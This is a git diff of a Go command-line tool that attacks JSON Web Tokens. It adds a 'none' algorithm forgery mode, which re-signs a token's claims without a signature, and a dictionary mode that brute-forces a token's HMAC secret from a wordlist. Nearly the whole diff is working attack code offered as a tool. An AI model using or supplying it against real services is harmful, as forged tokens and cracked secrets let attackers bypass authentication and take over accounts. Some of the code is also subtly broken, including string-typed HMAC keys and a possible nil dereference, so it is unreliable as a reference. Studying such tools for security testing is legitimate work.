@@ -1,9 +1,10 @@
 package main
 
 import (
-	//"os"
+	"os"
 	"fmt"
-	//"flag"
+	"bufio"
+	"flag"
 	"github.com/fatih/color"
 	"github.com/dgrijalva/jwt-go"
 )
@@ -16,47 +17,103 @@ var c = color.New(color.FgCyan)
 var m = color.New(color.FgMagenta)
 
 func main() {
-	jwtSample := "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImp0aSI6IjBiMDMyYTE0LTg2YTAtNGY0Ny05MDIzLTI3MWQ4ZjQ3NjdkNiIsImlhdCI6MTYwNzQwMjc3OCwiZXhwIjoxNjA3NDA2Mzc4fQ.NT0nnKnUVG9YyfPemYXJXKDX7hM_ylfct8PHU9_DbAg"
+	var attackType, jwtToken, wordlist string
 
-	token, headers, claims, valid := parseToken(jwtSample)
+	flag.StringVar(&jwtToken, "jwt", "", "Set jwt token (*)")
+	flag.StringVar(&attackType, "attackType", "noneAlg", "Select attack type: noneAlg, dictionary")
+	flag.StringVar(&wordlist, "wordlist", "", "Set dictionary path")
 
-	showToken(headers, claims, valid)
-	fmt.Println(token.Raw)
+	flag.Parse()
 
-	signToken(claims)
+	if (jwtToken == "") {
+		r.Println("JWT parameter must be set")
+		flag.PrintDefaults()
+		return
+	}
+
+	switch attackType {
+		case "dictionary":
+			dictionaryAttack(jwtToken, wordlist)
+			break
+		default:
+			noneAlgAttack(jwtToken)
+			break
+	}
+}
+
+func noneAlgAttack(jwtToken string) {
+	_, _, claims, _, err := parseToken(jwtToken, "")
+
+	if (err != nil){
+		r.Println("Token was not parsed: ", err.Error())
+		return
+	}
+
+	signToken(claims, "", jwt.SigningMethodNone)
+}
+
+func dictionaryAttack(jwtToken string, wordlist string)  {
+	file, err := os.Open(wordlist)
+
+	if (err != nil){
+		r.Println("Wordlist was not opened: " + err.Error())
+		return
+	}
+
+	defer file.Close() 
+
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		_, _, _, valid, err := parseToken(jwtToken, scanner.Text())
+
+		if (valid || err.Error() == "Token is expired") {
+			fmt.Println("Password:", scanner.Text())
+			return
+		} else {
+			r.Println("Password: " + scanner.Text())
+		}
+	}
 
 }
 
-func parseToken(jwtToken string) (*jwt.Token, map[string] interface{}, jwt.MapClaims, bool) {
-	token, _, err := parser.ParseUnverified(jwtToken, jwt.MapClaims{})
+func parseToken(jwtToken string, secret string) (*jwt.Token, map[string] interface{}, jwt.MapClaims, bool, error) {
+	var token *jwt.Token
+	var err error
 
-	if err != nil {
-		r.Println("Token was not parsed:", color.New(color.FgRed))
-		return nil, nil, nil, false
+	if (secret != ""){
+		token, err = parser.Parse(jwtToken, func (token *jwt.Token) (interface{}, error) {
+			return []byte(secret), nil
+		})
+	} else {
+		token, _, err = parser.ParseUnverified(jwtToken, jwt.MapClaims{})
 	}
-
+	
 	headers := token.Header
 	claims := token.Claims
 	valid := token.Valid
 
-	return token, headers, claims.(jwt.MapClaims), valid
+	return token, headers, claims.(jwt.MapClaims), valid, err
 }
 
-func signToken(claims jwt.MapClaims) {
-	method := jwt.NewWithClaims(jwt.SigningMethodNone, claims)
-	newToken, err := method.SignedString(jwt.UnsafeAllowNoneSignatureType)
+func signToken(claims jwt.MapClaims, secret string, alg jwt.SigningMethod) {
+	var newToken string
+	var err error
+
+	signMethod := jwt.NewWithClaims(alg,claims)
+
+	if (secret == "" || alg == jwt.SigningMethodNone){
+		newToken, err = signMethod.SignedString(jwt.UnsafeAllowNoneSignatureType)
+	} else {
+		newToken, err = signMethod.SignedString(secret)
+	}
 
 	if (err != nil){
 		r.Println("Token was not signed:" + err.Error())
 		return
 	}
 
-	fmt.Println(newToken)
-
-	_, headers, claims, valid := parseToken(newToken)
-
-	showToken(headers, claims, valid)
-
+	c.Println("***** New JWT *****")
+	m.Println(newToken)
 }
 
 func showToken(headers map[string]interface{}, claims jwt.MapClaims, valid bool) {
